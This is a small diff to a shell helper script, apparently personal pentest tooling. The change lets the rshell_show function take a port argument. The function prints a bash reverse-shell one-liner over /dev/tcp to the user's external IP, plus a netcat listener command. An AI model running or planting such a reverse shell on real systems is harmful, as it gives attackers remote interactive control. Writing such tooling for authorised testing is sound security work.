@@ -670,7 +670,8 @@ rshell_notify_local(){
 }
 
 rshell_show(){
-port=3389
+[ $# = 0 ] && port=3389
+[ $# = 0 ] || port=$1
 echo "bash -i >& /dev/tcp/$(myip | grep external | cut -d: -f2)/$port 0>&1"
 echo "nc -nlvp $port"
 }
